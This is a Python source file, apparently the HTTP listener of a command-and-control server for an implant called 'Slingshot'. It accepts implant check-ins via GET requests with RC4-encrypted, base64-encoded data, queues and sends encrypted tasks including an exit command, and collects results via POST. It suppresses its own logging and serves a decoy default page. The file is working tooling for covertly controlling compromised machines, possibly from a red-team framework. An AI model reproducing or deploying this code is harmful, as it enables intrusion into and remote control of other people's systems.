import os
import re
import base64
import time
from socketserver import ThreadingMixIn
from http.server import BaseHTTPRequestHandler, HTTPServer

from core.config import HTTPConfig, Paths
from core.encryption import RC4Crypt
from core import state
from core import logging

class ThreadedServer(ThreadingMixIn, HTTPServer):
    pass

class Server(BaseHTTPRequestHandler):

    # Disables verbose logging messages
    def log_message(self, format, *args):
        return
    
    # Disables error messages
    def log_error(self, format, *args):
        return
    
    def _set_headers(self, content_type = "application/x-www-form-urlencoded"):
        self.send_response(200)
        self.send_header("Content-Type", content_type)
        self.end_headers()

    # Slingshot uses GET requests to post target info and request tasking
    def do_GET(self):
        
        response = HTTPConfig.DefaultResponse.encode()

        if HTTPConfig.GetPage in self.path:
            
            (get_data ,) = re.findall(r'/{0}\?{1}=(.+)'.format(HTTPConfig.GetPage, HTTPConfig.GetVar), self.path)
            get_data = get_data.replace('~', '+').replace('_', '/').replace('-', '=')
            get_data = RC4Crypt(base64.b64decode(get_data), HTTPConfig.PSK)
            get_data = get_data.decode()
            target = state.add_callback(get_data, self.client_address[0])
            
            timeout = time.time() + HTTPConfig.Timeout
            
            while 1:
                if time.time() > timeout:
                    break

                if target.pending_tasks:
                    task, serialized_data = target.get_task()
                    response = base64.b64encode(RC4Crypt(serialized_data, HTTPConfig.PSK))

                    if task.code == state.TaskCode.Exit:
                        logging.success("Sending exit to {0}".format(task.target.target_id))
                        del state.Targets[task.target.target_id]

                    break
                
                time.sleep(.1)

        try:
            if response == HTTPConfig.DefaultResponse.encode():
                self._set_headers('text/html')
            else:
                self._set_headers()
            self.wfile.write(response)
        except:
            pass

        return

    # Slingshot uses POST requests to return tasking results
    def do_POST(self):

        response = HTTPConfig.DefaultResponse.encode()

        if HTTPConfig.PostPage in self.path:
            
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode()

            if post_data.startswith(HTTPConfig.PostVar):

                post_data = post_data.replace(HTTPConfig.PostVar + '=', '')
                post_data = post_data.replace('~', '+').replace('_', '/').replace('-', '=')
                post_data = RC4Crypt(base64.b64decode(post_data), HTTPConfig.PSK)

                state.handle_result(post_data)

        try:
            self._set_headers()
            self.wfile.write(response)
        except:
            pass

        return
